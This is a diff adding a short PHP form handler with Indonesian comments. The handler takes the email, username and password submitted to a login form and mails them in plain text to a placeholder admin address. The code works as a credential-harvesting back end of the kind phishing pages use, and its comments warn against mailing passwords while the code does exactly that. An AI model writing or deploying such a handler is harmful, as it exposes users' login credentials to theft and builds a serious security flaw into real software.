@@ -1,0 +1,26 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Mengambil data yang dikirim dari form
+    $email = $_POST['email'];
+    $username = $_POST['username'];
+    $password = $_POST['password']; // Pastikan password tidak dikirim melalui email secara langsung!
+
+    // Subjek dan isi email
+    $subject = "Informasi Login Baru";
+    $message = "Ada login baru:\n\n";
+    $message .= "Email: " . $email . "\n";
+    $message .= "Username: " . $username . "\n";
+    $message .= "Password (jangan kirim password melalui email ini): " . $password . "\n";  // **Hati-hati dengan informasi sensitif!
+
+    // Pengaturan email
+    $to = "admin@domainanda.com";  // Gantilah dengan email tujuan yang sesuai
+    $headers = "From: no-reply@domainanda.com";
+
+    // Mengirim email
+    if (mail($to, $subject, $message, $headers)) {
+        echo "Informasi login berhasil dikirim.";
+    } else {
+        echo "Gagal mengirim email.";
+    }
+}
+?>
